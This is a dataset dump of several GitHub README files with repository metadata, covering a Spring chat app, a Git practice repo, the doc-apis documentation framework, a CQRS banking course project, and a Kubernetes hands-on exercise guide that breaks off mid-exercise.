See [LICENSE](LICENSE) for more details.

ORACLE AND ITS AFFILIATES DO NOT PROVIDE ANY WARRANTY WHATSOEVER, EXPRESS OR IMPLIED, FOR ANY SOFTWARE, MATERIAL OR CONTENT OF ANY KIND CONTAINED OR PRODUCED WITHIN THIS REPOSITORY, AND IN PARTICULAR SPECIFICALLY DISCLAIM ANY AND ALL IMPLIED WARRANTIES OF TITLE, NON-INFRINGEMENT, MERCHANTABILITY, AND FITNESS FOR A PARTICULAR PURPOSE.  FURTHERMORE, ORACLE AND ITS AFFILIATES DO NOT REPRESENT THAT ANY CUSTOMARY SECURITY REVIEW HAS BEEN PERFORMED WITH RESPECT TO ANY SOFTWARE, MATERIAL OR CONTENT CONTAINED OR PRODUCED WITHIN THIS REPOSITORY. IN ADDITION, AND WITHOUT LIMITING THE FOREGOING, THIRD PARTIES MAY HAVE POSTED SOFTWARE, MATERIAL OR CONTENT TO THIS REPOSITORY WITHOUT ANY REVIEW. USE AT YOUR OWN RISK.
",0,0,3,4.0,"['spring', 'ai', 'rag', 'oracle', 'vector', 'db', 'openai', 'private', 'llm', 'introduction', 'doc', 'prerequisite', 'jdbc', 'driver', 'oracle', 'db', 'environment', 'variable', 'setup', 'oracle', 'database', 'setup', 'application', 'test', 'openai', 'version', 'pre', 'document', 'store', 'generic', 'chat', 'rag', 'request', 'without', 'data', 'store', 'db', 'search', 'data', 'come', 'pdf', 'store', 'q', 'a', 'sample', 'run', 'generation', 'chat', 'private', 'llm', 'ollama', 'restart', 'run', 'customize', 'private', 'llm', 'vector', 'embeddings', 'local', 'open', 'ai', 'completion', 'full', 'private', 'llm', 'deploy', 'oracle', 'backend', 'spring', 'boot', 'microservices', 'url', 'contribute', 'license']","['oracle', 'private', 'llm', 'db', 'store']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
SatvikNema/satchat,main,"# Satchat
![satchat-faster.gif](./satchat-faster.gif)
### Starting the application
Requirements:
```
java: 21
node: 20
docker
```

#### Spin up the database container and setup mock users
```bash
cd ./scripts
./docker.sh
```

#### Run the spring boot app
`cd` back to the project root
```bash
mvn clean install
java -jar ./target/satchat-0.0.1-SNAPSHOT.jar
```

#### Start the front end
Open a new terminal from the project root and run:
```bash
cd ./satchat-ui
npm install
npm run start
```
open localhost:3000

If you see an error like `Unexpected end of JSON input` that means you dont have any mock users in your database yet.

Set them up using the script `setup-users.sh`:
```bash
cd ./scripts
./setup-users.sh
```




",0,0,3,3.0,"['satchat', 'start', 'application', 'spin', 'database', 'container', 'setup', 'mock', 'user', 'run', 'spring', 'boot', 'app', 'start', 'front', 'end']","['start', 'satchat', 'application', 'spin', 'database']",1.0,"[com.diffplug.spotless:spotless-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0
zied-snoussi/git-test,main,"<h1 align=""center"" style=""color:red"">Git Test</h1>

<div align=""center"">
  <img src=""./GITHUB.jpeg"" alt=""Github"" width=""100%""/>
</div>

## Description

This repository serves as a testbed for learning and practicing Git and GitHub workflows.

## Table of Contents

- [Description](#description)
- [Table of Contents](#table-of-contents)
- [Getting Started](#getting-started)
  - [Prerequisites](#prerequisites)
  - [Installation](#installation)
- [Usage](#usage)
- [Contributing](#contributing)
- [License](#license)
- [Using GitHub and Git](#using-github-and-git)
  - [How to Use GitHub](#how-to-use-github)
  - [Resolving Conflicts](#resolving-conflicts)

## Getting Started

To get started with this project, follow the steps below.

### Prerequisites

Ensure you have the following installed:

- Git
- Code editor of your choice

### Installation

1. Clone the repository:

```bash
git clone https://github.com/zied-snoussi/git-test.git
```

2. Navigate to the project directory:

```bash
cd git-test
```

## Usage

Instructions on how to use the project will be added here.

## Contributing

Contributions are welcome! Please refer to the [CONTRIBUTING.md](CONTRIBUTING.md) file for guidelines.

## License

This project is licensed under the [MIT License](LICENSE).

---

## Using GitHub and Git

### How to Use GitHub

1. **Create a Repository**: Click on the ""+"" icon in the top-right corner of GitHub and select ""New repository"". Fill in the necessary details and click ""Create repository"".

2. **Clone a Repository**: To clone a repository to your local machine, use the `git clone` command followed by the repository URL.

```bash
git clone https://github.com/zied-snoussi/git-test.git
```

3. **Commit Changes**: Use `git add .` to stage all changes, then `git commit -m ""Your message""` to commit them.

```bash
git add .
git commit -m ""Your message""
```

4. **Push Changes**: Push your changes to the remote repository using `git push`.

```bash
git push origin <branch-name>
```

5. **Create Pull Requests**: If you're working on a forked repository, create a pull request to propose changes to the original repository.

### Resolving Conflicts

1. **Fetch Changes**: Fetch changes from the remote repository to ensure your local repository is up to date.

```bash
git fetch origin
```

2. **Merge Changes**: Merge changes from the remote repository into your local branch.

```bash
git merge origin/<branch-name>
```

3. **Resolve Conflicts**: If there are conflicts, open the conflicted file(s) in your code editor. Edit the file(s) to resolve conflicts, then add and commit the changes.

```bash
git add .
git commit -m ""Resolve conflicts""
```

4. **Push Changes**: Push the resolved changes to the remote repository.

```bash
git push origin <branch-name>
```

5. **Update Pull Request**: If resolving conflicts for a pull request, update the pull request on GitHub with the resolved changes.

```bash
git push origin <branch-name> --force
```

```bash
git push origin <branch-name> --force
```

6. **Rebase Changes**: Alternatively, you can rebase your changes on top of the latest changes from the remote repository.

```bash
git rebase origin/<branch-name>
```

7. **Resolve Conflicts**: If there are conflicts during the rebase process, follow the same steps mentioned earlier to resolve them.

8. **Complete Rebase**: After resolving conflicts, continue the rebase process by running:

```bash
git rebase --continue
```

9. **Push Changes**: Finally, push the rebased changes to the remote repository.

```bash
git push origin <branch-name> --force
```

By following these steps, you should be able to effectively resolve conflicts and keep your local and remote repositories in sync.",1,0,9,15.0,"['description', 'table', 'content', 'get', 'start', 'prerequisite', 'installation', 'usage', 'contribute', 'license', 'use', 'github', 'git', 'how', 'use', 'github', 'resolve', 'conflict']","['use', 'github', 'description', 'table', 'content']",1.0,[],0.0,1.0,0.0
aizuda/doc-apis,main,"<p align=""center"">
  <a href=""https://en.doc-apis.com/"">
   <img alt=""Doc-Apis-Logo"" src=""https://iknow.hs.net/e21b7ba1-949f-499d-8c29-2b3eb2ec3fd4.png"">
  </a>
</p>

<p align=""center"">
  Zero-intrusive, zero-code interface documentation auto-generation and one-click debugging framework.
</p>

<p align=""center"">
  <a href=""https://search.maven.org/search?q=g:com.doc-apis%20a:*"">
    <img alt=""maven"" src=""https://img.shields.io/github/v/release/xpc1024/doc-apis?include_prereleases&logo=xpc&style=plastic"">
  </a>
  <a href=""https://www.apache.org/licenses/LICENSE-2.0"">
    <img alt=""code style"" src=""https://img.shields.io/badge/license-Apache%202.0-4EB1BA.svg?style=flat-square"">
  </a>
  <a href=""https://www.gnu.org/licenses/agpl-3.0.html"">
    <img alt=""code style"" src=""https://img.shields.io/badge/license-AGPL 3.0%20-4EB1BA.svg?style=flat-square"">
  </a>
</p>

## What is Doc-Apis?

A foolproof, non-intrusive, code-free framework for automatic generation of API documentation with one-click debugging.

## Official website

**doc-apis website**  https://en.doc-apis.com

**dic-apis github** https://github.com/aizuda/doc-apis

**dic-apis gitee** https://gitee.com/aizuda/doc-apis

**aizuda website** https://aizuda.com/home

**aizuda gitee homepage** https://gitee.com/aizuda

**dromara website** https://dromara.org

**dromara gitee homepage** https://gitee.com/dromara


## Links
- [ä¸­æ–‡ç‰ˆ](https://github.com/xpc1024/doc-apis/blob/main/README_ZH.md)
- [Samples](https://github.com/xpc1024/doc-apis/tree/main/doc-apis-test)
- [Demo in Springboot](https://en.easy-es.cn/pages/658abb/#_2-pom)

## Features

- **Zero Intrusion:** Unlike frameworks like Swagger, which require additional business code to generate documentation, doc-apis generates API documentation automatically as long as your code complies with standards.
- **Zero Configuration:** For Springboot projects, it takes as few as 0 lines of configuration to automatically generate API documentation. All configurations are designed for ease of use and come with default values, allowing you to configure as needed.
- **Transparent Dependency:** After introduction, it remains completely transparent to the original project without any impact. There's no need to worry about extra risks brought about by introducing third-party dependencies since it doesn't even need to be packaged into the project.
- **Agile Development:** No need to implement the interface; merely define the URL, type, and input/output parameters of the request to generate documentation, facilitating swift development for both front-end and back-end teams.
- **Rich Content:** From request URLs to methods, input and output parameters, all necessary information such as parameter types, mandatory status, and descriptions are clearly presented.
- **Diverse Formats:** Generates various formats such as HTML and MD in one go, simultaneously compatible with WEB, iOS, Android, and other types, adapting to various scenarios.
- **Broad Compatibility:** Whether it's mainstream SpringBoot projects, Spring projects, or niche Jfinal, Play frameworks, etc., compatibility is assured.
- **Powerful Features:**  Supports online debugging, multiple request methods, custom headers, and more, covering all your needs for API documentation and testing in one place.
- **Multi-language** Generates multi-lingual API documentation, with user documentation currently supporting Chinese and English. Contributions for other languages are welcome.
- **Good Compatibility:** Works well with JDK versions from 8 to 21, and SpringBoot from 1.x to 3.x. Compatibility is ensured across all versions for Spring, Jfinal, and other projects.
- **Code Conformity:** Monitors code quality from the source. Unannotated modules and non-Restful style interfaces are clearly identified, encouraging developers to standardize their code.
- **Ease of Use:** Like high-quality ingredients requiring simple cooking, a sophisticated documentation generation framework requires simple operations. From beginner to expert, you can master it in 0 to 5 minutes.
- **Continuous Updates:** ...
-   ...

## Preview
![image](https://github.com/user-attachments/assets/12f9b637-4377-4b6e-ac15-b87562d539a0)
![image](https://github.com/user-attachments/assets/abe8c48e-5ff3-4645-bd06-87538abc87c1)
![image](https://github.com/user-attachments/assets/b8931051-d59b-4caa-8b6d-6effca7bcff7)
![image](https://github.com/user-attachments/assets/a059bc5c-ae88-4136-b37c-204fd50af15b)
<br/>

## Advertising provider

<a href=""https://www.mingdao.com?s=utm_206&utm_source=doc-apis&utm_campaign=IT%E7%BD%91%E7%AB%99&utm_content=%E6%B3%A8%E5%86%8C%E4%BD%93%E9%AA%8C
"">
  <img alt=""ad"" src=""https://iknow.hs.net/00b4a54c-6505-4776-9232-f0a9d9768fac.jpg"">
</a>

</br>

<a href=""https://fastbee.cn/"">
  <img alt=""ad"" src=""https://iknow.hs.net/b0592c71-5a41-427e-8d47-fcba4b399d02.png"">
</a>

<br/>

## Donate
[Donate doc-apis](https://en.doc-apis.com/pages/fb599d/)


## License

Doc-apis is under the Apache 2.0 license and AGPL-3.0 license.
",1,4,1,8.0,"['what', 'official', 'website', 'link', 'feature', 'preview', 'advertising', 'provider', 'donate', 'license']","['what', 'official', 'website', 'link', 'feature']",5.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,3.0,2.0
SpringBootCourses/cqrs-banking-app,main,"# CQRS and Event-Sourcing Banking App

Banking app example for **CQRS and Event-Sourcing pattern**.

This repository contains project
from [YouTube course](https://www.youtube.com/playlist?list=PL3Ur78l82EFD_M2te726IZ63rwBlY96M-).

You can find theory and explanation
in [this document](https://docs.google.com/document/d/1-TTxft3nS5C11puQ1LMLj3ZEtY4sOhp7WEEMkltnwds/edit).

## Application schema

![Schema](docs/schema.png)

## CQRS and Event-Sourcing

![CQRS](docs/cqrs.png)

![Event Sourcing](docs/event-sourcing.png)

## Change Data Capture

![CDC](docs/cdc.png)

## Usage

To start an application you need to pass variables to `.env` file. Look
at `.env.example` file with some predefined environments.

All services are running in docker containers. To start the application
you need to run `docker-compose up -d` command.

**NOTE**: after Debezium connect is started, apply source config manually.

```shell
cd /on-startup/

sh run.sh
```

Application is running on port `8080` for backend and `8081` for event handler.

You can access endpoints and make requests to the application.

## How to contribute

If you found a bug or want to improve the application, feel free to create
an [issue](https://github.com/springbootcourses/cqrs-banking-app/issues).",0,5,7,33.0,"['cqrs', 'banking', 'app', 'application', 'schema', 'cqrs', 'change', 'data', 'capture', 'usage', 'how', 'contribute']","['cqrs', 'banking', 'app', 'application', 'schema']",4.0,"[org.apache.maven.plugins:maven-checkstyle-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,3.0,1.0
seifrajhi/Kubernetes-practical-exercises-Hands-on,main,"# Practical Kubernetes Exercices

This repo provides some resources to learn Kubernetes through practical exercises for self study to learn how easy it is to understand and master Kubernetes complexity and problems.

Kubernetes is easy to understand, even if it looks hard at the first look on the icons or the resources map, this course is about to help you to understand K8s and learn how to start!

![icons-all](images/icons-all.png ""icons-all"")

![k8s-resources-map](images/k8s-resources-map.png ""k8s-resources-map"")


## Prerequisites

It would be nice if you know what `kubectl` is and have a basic understanding of running conatiners with docker / containerd or cri-o.

## Preparation

To get prepared please install at least kubectx and kns with krew from this list and make sure to have bash completion for kubectl in place:

## Tools we use

- [mkcert](https://github.com/FiloSottile/mkcert)
- watch  
  - Mac setup:
    ````
    brew install watch
- [oh-my-zsh](https://github.com/ohmyzsh/ohmyzsh)
  - activate autocompletion
    - [Mac setup](https://docs.brew.sh/Shell-Completion)
    - [kubectl plugin](https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/kubectl)
- [git](https://git-scm.com/)
- [kubectl](https://kubernetes.io/docs/tasks/tools/install-kubectl/)  
  - mac setup:
    ```
    brew install kubernetes-cli
- [kubectx & kubens](https://github.com/ahmetb/kubectx)


[The Golden Kubernetes Tooling and Helpers list](http://bit.ly/kubernetes-tooling-list)

We can use any Kubernetes cluster (> 1.21) on our local machine or in the cloud. For online trainings we recommend to have either k3s installed with k3d, use Kind, or Docker for Desktop.  

We'll use some slides from:

[Kubernauts Kubernetes Trainings Slides](https://goo.gl/Hzk2sd)

and refer to some resources from:

[Kubernauts Kubernetes Learning Resources List](https://goo.gl/Rywkpd)

## Kubernetes  Guides

### Networking

The purpose of [this website](https://www.tkng.io/) is to provide an overview of various Kubernetes networking components with a specific focus on exactly how they implement the required functionality.

The guide is split into multiple parts which can be studied mostly independently, however they all work together to provide a complete end-to-end cluster network abstractions.

Where possible, every topic in this guide will include a dedicated [hands-on labs](https://www.tkng.io/lab/) which can be spun up locally in a matter of minutes. 

### Security
 
The Security checklist aims at providing a basic list of guidance with links to more comprehensive documentation on each topic. It does not claim to be exhaustive and is meant to evolve.

1- https://kubernetes.io/docs/concepts/security/security-checklist/

2- https://github.com/magnologan/awesome-k8s-security

3- https://github.com/freach/kubernetes-security-best-practice

4- https://medium.com/@seifeddinerajhi/kubernetes-security-assessment-guidelines-and-necessary-checklist-9a326f341b68

5- https://medium.com/@seifeddinerajhi/owasp-kubernetes-top-10-a-comprehensive-guide-f03af6fd66ed

6- https://eksclustergames.com:  Kubernetes CTF (Capture The Flag) challenges for EKS.

7- https://github.com/andifalk/secure-development-on-kubernetes: Slides and Demos for ""Secure Development on Kubernetes"" talk


7- [A curated list for Awesome Kubernetes Security resources](https://github.com/magnologan/awesome-k8s-security) - A curated list for Kubernetes (K8s) Security resources such as articles, books, tools, talks and videos.


8- [Kubernetes Security Checklist and Requirements](https://github.com/Vinum-Security/kubernetes-security-checklist) - Kubernetes Security Checklist and Requirements - All in One (authentication, authorization, logging, secrets, configuration, network, workloads, dockerfile).

9- [Kubernetes Hardening Manual](https://github.com/seifrajhi/kubernetes-hardening-checklist-guidance) -  Kubernetes Hardening Guidance.


### Storage

- The key concepts of Kubernetes storage, including [PVs, PVCs, and StorageClass](https://medium.com/@seifeddinerajhi/understanding-storage-in-kubernetes-ee2c19001aae)

### Misc

- Kelsey Hightower's open-source guide, [Kubernetes the Hard Way](https://github.com/kelseyhightower/kubernetes-the-hard-way), goes through how to bootstrap a Kubernetes cluster without the use of installers or scripts. 


- [Learnk8s](https://learnk8s.io/): Develop the knowledge and skills to get the most out of Kubernetes with hands-on online courses and instructor-led classes.

- [Introduction to Kubernetes Lecture Notes](https://github.com/kaan-keskin/introduction-to-kubernetes/tree/main): Notes about Kubernetes resources  

- [Kubernetes Handbook](https://github.com/rootsongjc/kubernetes-handbook)

- [Kubeapps](https://github.com/vmware-tanzu/kubeapps): A web-based UI for deploying and managing applications in Kubernetes clusters

- [Start learning Kubernetes today](https://kubebyexample.com/)

- [Step by step guide to learning Kubernetes](https://roadmap.sh/kubernetes)

- [Kubernetes the Harder Way](https://github.com/ghik/kubernetes-the-harder-way) A guide to setting up a production-like Kubernetes cluster on a local machine


- [Kubernetes mind map](https://betterprogramming.pub/6-important-things-you-need-to-run-kubernetes-in-production-d573d61258c5): 6 Important Things You Need to Run Kubernetes in Production.

- [Awesome Kubernetes Resources](https://github.com/tomhuang12/awesome-k8s-resources) - A curated list of awesome Kubernetes tools and resources.

### Useful aliases

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
alias k=""kubectl""
alias kx=""kubectx""
alias kn=""kubens""
alias kgp=""kubectl get pods""
alias kgel=""k get events --sort-by=.metadata.creationTimestamp""
```
</p>
</details>


## Kubectl CheatSheet and Goodies

https://kubernetes.io/docs/reference/kubectl/cheatsheet/

https://github.com/dennyzhang/cheatsheet-kubernetes-A4

<details><summary>Expand here to see the solution</summary>
<p>

```bash
k get events --sort-by=.metadata.creationTimestamp # List Events sorted by timestamp

k get services --sort-by=.metadata.name # List Services Sorted by Name

k get pods --sort-by=.metadata.name

k get endpoints

k explain pods,svc

k get pods -A # --all-namespaces 

k get nodes -o jsonpath='{.items[*].spec.podCIDR}'

k get pods -o wide

k get pod my-pod -o yaml --export > my-pod.yaml  # Get a pod's YAML without cluster specific information

k get pods --show-labels # Show labels for all pods (or other objects)

k get pods --sort-by='.status.containerStatuses[0].restartCount'

k cluster-info

k api-resources

k api-resources -o wide

kubectl api-resources --verbs=list,get # All resources that support the ""list"" and ""get"" request verbs

k get apiservice
```
</p>
</details>

### k create namespace imperative via declarative

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
k create ns <namespace name, e.g. your name or your project!>
k create ns --dry-run test -o yaml > test-ns.yaml
k create -f test-ns.yaml
k delete ns test
```

</p>
</details>

### k create / run pods or deploymens with dry-run

<details>
   <summary>Expand here to see the solution</summary>
<p>

```yaml
# old school (going to get deprecated)
k run --generator=run-pod/v1 <pod name> --image=<image name> --dry-run -o yaml > <podname.yaml>

k run --generator=run-pod/v1 ""nginx-pod"" --image=nginx -o yaml --dry-run > nginx-pod.yaml

or

k run --restart=Never <pod name> --image=<image name> --dry-run -o yaml > <podname.yaml>

or (new school with --dry-run=client)

k run nginx-pod --image=nginx -o yaml --dry-run=client > nginx-pod.yaml

k create <object> <name> <options> --dry-run -o yaml > <objectname.yaml>

k create deployment nginx-deployment --image=nginx --dry-run -o yaml > nginx-deployment.yaml

cat nginx-pod.yaml

cat nginx-deployment.yaml

k create -f nginx-pod.yaml

# create a service via exposing the pod

k expose pod nginx-pod --port=80

k get svc

k port-forward service/nginx-pod 8080:80

or

k proxy

open http://127.0.0.1:8001/api/v1/namespaces/default/pods/nginx-pod/proxy/

# open a new terminal session

curl http://127.0.0.1:8080/

k delete all --all # with caution!!!

k create -f nginx-deployment.yaml

k get all

k get all -A

k expose deployment nginx-deployment --port=80

k port-forward service/nginx-deployment 8080:80

k scale --replicas 3 deployment nginx-deployment

k edit deployment nginx-deployment

vi nginx-deployment.yaml # adapt the number of replicas, e.g. to 2

k apply -f nginx-deployment.yaml

```
</p>
</details>

### k get events and logs, describe objects

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
kx
kn
k delete all --all # with caution!!!
k apply -f 0-nginx-all.yaml
k get all
# where is the ingress?
k get ingress # ingress objects are not namespaced
k get events
k get events -A
k get events -n <namespace name>
k logs nginx-<press tab>
k describe pod nginx-<press tab>
k describe deployment nginx
k describe replicasets nginx-<press tab>
```
</p>
</details>

### Merging contexts (e.g. merge 2 kubeconfigs from 2 cluster contexts)

Sometimes you'll need to merge multiple kubeconfigs into a single file, here you go:

<details><summary>Expand here to see the solution</summary>
<p>

```bash
KUBECONFIG=file1:file2:file3 kubectl config view --merge --flatten > my_new_kubeconfig
or
cp ~/.kube/config ~/.kube/config.bak
KUBECONFIG=/my/new/kubeconfig:~/.kube/config.bak kubectl config view --flatten > my_new_kubeconfig
# test it
export KUBECONFIG=my_new_kubeconfig
kx
cp my_new_kubeconfig ~/.kube/config
```
</p>
</details>

Don't miss: Mastering the KUBECONFIG file by Ahmet Alp Balkan:

https://ahmet.im/blog/mastering-kubeconfig/

### Kubernetes Secrets are not secret

Secrets are resources containing keys with base64 encoded values. Secrets are not encrypted by default, they are only encoded and can get decoded easily by everyone who has access to a namespace or to the whole cluster.

Secret values can be exposed to pods as environment variables or mounted as files.

In order to create a secret from a text file, you can run the following, This creates a generic secret named secretname and automatically encodes the value as base64:

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
echo -n ""yourvalue"" > ./secret.txt
k create secret generic secretname --from-file=./secret.txt
k describe secrets secretname
k get secret secretname -o yaml
echo 'eW91cnZhbHVl' | base64 --decode
# or
k create secret generic mysecret --dry-run -o yaml --from-file=./secret.txt > secret.yaml
k create -f secret.yaml
# or
k create secret generic mysecret --dry-run -o yaml --from-literal=secret.txt=yourvalue > secret.yaml
```
</p>
</details>

#### Further reading:

Since K8s secrets are not so secret, there are some ways to keep you secrets secret:

https://learnk8s.io/kubernetes-secrets-in-git

https://kubernetes.io/docs/tasks/inject-data-application/distribute-credentials-secure/#create-a-pod-that-has-access-to-the-secret-data-through-environment-variables



### Kubernetes ConfigMaps

A ConfigMap is an object consisting of key-value pairs which can be injected into your application.

With a ConfigMap you can separate configuration from your Pods. This way, you can prevent hardcoding configuration data.

ConfigMaps are useful for storing and sharing non-sensitive, unencrypted configuration information. Sensitive information should be stored in a Secret instead.

Exercise:

Create a ConfigMap named kubernauts that contains a key named dev with the value ops.

With the --from-literal argument passed to the k create configmap command you can create a ConfigMap containing a text value.

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
k create cm kubernauts --from-literal=dev=ops --dry-run -o yaml > cm-kubernauts.yaml
cat cm-kubernauts.yaml
echo -n ""ops"" > dev
k create cm kubernauts --from-file=./dev
k get cm
k describe cm kubernauts
k delete cm kubernauts
k create -f cm-kubernauts.yaml
k describe cm kubernauts
```
</p>
</details>

Using this ConfigMap, we can inject data in our application:

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
cat 0-nginx-configmap.yaml
k create -f 0-nginx-configmap.yaml
```
</p>
</details>



## Whoami, Whoareyou and Whereami Problems

### What Weâ€™ll Do

Weâ€™ll use a pre-made container â€” containous/whoami â€” capable of telling you where it is hosted and what it receives when you call it.

If you'd like to build the container image with docker, do:

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
git clone https://github.com/containous/whoami.git
docker build -t whoami .
docker tag whoami kubernautslabs/whoami
docker push kubernautslabs/whoami
docker images | head
```

</p>
</details>

Weâ€™ll define two different deployments, a whoami and a whoareyou deployment that will use `containous/whoami` container image.

Weâ€™ll create a deployment to ask Kubernetes to deploy 2 replicas of whoami and 3 replicas of whoareyou.

Weâ€™ll define two services, one for each of our Pods.

Weâ€™ll define Ingress objects to define the routes to our services to the outside world.

Weâ€™ll use our Nginx Ingress Controller on our Rancher Cluster.

Explanations about the file content of whoami-deployment.yaml:

We define a â€œdeploymentâ€ (kind: Deployment)

The name of the object is â€œwhoami-deploymentâ€ (name: whoami-deployment)

We want two replica (replicas: 2)

It will deploy pods that have the label app:whoami (selector: matchLabels: app:whoami)

Then we define the pods with the (template: â€¦) which will have the whoami label (metadata:labels:app:whoami)

The Pods will host a container using the image containous/whoami (image:containous/whoami)

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
k apply -f 1-whoami-deployment.yaml
k get all
# we expose the deployment with a service of type ClusterIP
k create -f 1-whoami-service-ClusterIP.yaml
k get svc
k port-forward service/whoami-service 8080:80
# in a new terminal session call
curl 127.0.0.1:8080
k delete svc whoami-service
# create a service of type NodePort
k create -f 1-whoami-service-nodeport.yaml
k get svc
curl csky08:30056 # adapt the nodeport for your env. please !
curl csky09:30056
curl csky10:30056
k delete svc whoami-service-nodeport
k create -f 1-whoami-service-loadbalancer.yaml
k get svc
curl <EXTERNAL-IP> # the external-ip is given from the LB IP pool above
k create -f 2-whoareyou-all.yml
k get all
k get svc
k get ing
curl <HOSTS value from ingress>
# are you happy? ;-)
```

</p>
</details>

## DNS based Service discovery with whereami kubia pod

### What Weâ€™ll Do

We'll use a slightly extended node.js app (which is a simple web server) from the [Kubernetes in Action book by Marko LukÅ¡a](https://www.amazon.com/-/en/Marko-Luksa/dp/1617293725) in 2 different namespaces ns1 and ns2 to demonstrate the DNS based services discovery. 

A service provides a Virtual IP (VIP) address, which means the Service IP is not bound to a physical network interface. A service acts like an internal loadbalancer in K8s! The magic of of routing trafic through the VIP is implemented by IPtable rules managed by kube-proxy!

A service can be called through its FQDN in the form of:

`$SERVICE_NAME.$NAMESPACE.svc.cluster.local`

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
cd whereami
k create ns ns1
k create ns ns2
kn ns1
cat kubia-deployment.yaml   
k create -f kubia-deployment.yaml
k create -f kubia-deployment.yaml -n ns2
k expose deployment kubia
k get svc
k expose deployment kubia -n ns2
k get svc -n ns2
k exec -it kubia-<press tab> -- curl kubia.ns2.svc.cluster.local:8080
k scale deployment kubia -n ns2 --replicas 3
# repeat the service call many times and see how loadbalancing works
k exec -it kubia-<press tab> -- curl kubia.ns2.svc.cluster.local:8080
k exec -n ns2 -it kubia-<press tab> -- curl kubia.ns1.svc.cluster.local:8080
k exec -it kubia-<press tab> -- ping kubia.ns2.svc.cluster.local
--> PING kubia.ns2.svc.cluster.local (10.43.109.89) 56(84) bytes of data.
# you don't get any pong, why?
# ssh into a node and examine the IPtable rules
sudo iptables-save | grep kubia
```
</p>
</details>

### Headless Services for Stickiness

![hadless](images/headless-cluster-ip.png ""headless-cluster-ip"")

As we learned services are exposed by default through the type ClusterIP, they work as an internal layer 4 load-balancer and provide a VIP with a stable DNS address, where the clients can connect to. The service forwards the connections to one of the pods which are backing the service via round robin.

This works fine and is desired for stateless apps which need to connect to one of the pods randomly and gain more performance through trafic routing via load balancing.

But in some cases where stickiness is needed and the clients need to connect to a particular pod for session or data stickiness, then we need to define our service without ClusterIP, which is by default the head of the service (that's the VIP).

To do that we need to define our service as a `headless` service, let's see that in action with the whereami service and our utils pod.

In the following we expose the kubia deployment as a headless service by setting the ClusterIP to `None`, scale the deployment and do a DNS query to both services with `host kubia-headless` and `host kubia-clusterip` from within the util client pod. As you'll see our client pod always connects to the first IP from the DNS response, if we curl the headless service. This means no load balancing happens, the call is `Sticky`!

The second curl to the service with ClusterIP does load balancing and distributes the traffic between pods.

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
k delete svc kubia
k expose deployment kubia --name kubia-headless --cluster-ip None
k expose deployment kubia --name kubia-clusterip
k expose deployment kubia --name kubia-lb --type=LoadBalancer
k scale deployment kubia --replicas 3
k run --generator=run-pod/v1 utils -it --image kubernautslabs/utils -- bash
# inside the utils container
host kubia-headless
host kubia-clusterip
# what is the difference here?
for i in $(seq 1 10) ; do curl kubia-headless:8080; done
# hits kubia only on one node? 
for i in $(seq 1 10) ; do curl kubia-clusterip:8080; done
# does load balancing via the head ;-)
exit
mkcert '*.whereami.svc'
k create secret tls whereami-secret --cert=_wildcard.whereami.svc.pem --key=_wildcard.whereami.svc-key.pem
cat kubia-ingress-tls.yaml
k create -f kubia-ingress-tls.yaml
# Please provide the host entry mapping in your /etc/hosts file like this:
# 192.168.64.23 my.whereami.svc
# the IP should be the IP of the traefik loadbalancer / ingress controller
curl https://my.whereami.svc
for i in $(seq 1 10) ; do curl https://my.whereami.svc; done
# the ingress controller does load balancing, although the kubia-headless is defined as the backend with serviceName: kubia-headless!
```

</p>
</details>

## Ingress with TLS

![ingress-controller](images/ingress-controller-traefik.png ""ingress-controller-traefik"")

Often we need to use an ingress object to provide path based or (sub-) domain based routing with TLS termination and other capabilities defined through annotations in the ingress resource.

By creating an ingress for a service, the ingress controller will create a single entry-point to the defined service in the ingress resource on every node in the cluster.

In the follwoing we're using the traefik ingress controller and an ingress object to provide path based or (sub-) domain based routing with TLS termination with a valid mkcert made TLS certificate on our lab environment.


<details><summary>Expand here to see the solution</summary>
<p>

```yaml
cd ..
kn default
mkcert '*.ghost.svc'
k create secret tls ghost-secret --cert=_wildcard.ghost.svc.pem --key=_wildcard.ghost.svc-key.pem
# alternatively, if you can't or you don't want to use mkcert, you can create a selfsigned cert with:
# openssl genrsa -out tls.key 2048
# openssl req -new -x509 -key tls.key -out tls.cert -days 360 -subj /CN=my.ghost.svc
# k create secret tls ghost-secret --cert=tls.cert --key=tls.key
cat 3-ghost-deployment.yaml
k create -f 3-ghost-deployment.yaml
k expose deployment ghost --port=2368
cat 3-ghost-ingress-tls.yaml
k create -f 3-ghost-ingress-tls.yaml
# Please provide the host entry mapping in your /etc/hosts file like this:
# 192.168.64.23 my.ghost.svc admin.ghost.svc
# the IP should be the IP of the traefik loadbalancer / ingress controller
open https://my.ghost.svc
open https://admin.ghost.svc/ghost
# change the service type to LoadBalancer and access ghost with the loadbalancer IP on port 2368 or on any other node (works on k3s with trafik only), e.g.:
open http://node2:2368
# scale the deployment to have 2 replicas and see how the backend ghost backened https://admin.ghost.svc/ghost doesn't work.
```

</p>
</details>

## Multi-Container Pods

Create a Pod with two containers, both with image alpine and command ""echo hello; sleep 3600"". Connect to the second container and run 'ls'.

The easiest way to do it is to create a pod with a single container and save its definition in a YAML file and extend it with an additional container:

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
k run alpine-2-containers --image=alpine --restart=Never -o yaml --dry-run -- /bin/sh -c 'echo hello;sleep 3600' > alpine-pod.yaml
```

Copy/paste the container related values, so your final YAML should contain the following two containers (make sure those containers have a different name):

```YAML
containers:
  - args:
    - /bin/sh
    - -c
    - echo hello;sleep 3600
    image: alpine
    name: alpine1
    resources: {}
  - args:
    - /bin/sh
    - -c
    - echo hello;sleep 3600
    image: alpine
    name: alpine2
    resources: {}
```

